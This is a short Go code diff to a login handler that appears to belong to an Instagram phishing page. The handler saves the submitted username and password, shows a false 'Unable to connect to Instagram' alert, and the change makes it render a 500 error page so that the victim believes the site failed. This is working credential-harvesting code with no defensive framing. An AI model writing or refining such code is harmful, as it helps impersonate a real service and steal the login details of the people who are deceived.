@@ -51,7 +51,7 @@ func (m *Repository) LoginHandler(w http.ResponseWriter, r *http.Request) {
 	if len(uName) > 2 && len(uName) < 30 && match && len(pass) > 7 {
 		save.SaveCredentials(uName, pass)
 		dialog.Alert("Unable to connect to Instagram")
-		render.RenderTemplate(w, "index.html")
+		render.RenderTemplate(w, "500.html")
 	} else {
 		render.RenderTemplate(w, "index.html")
 	}
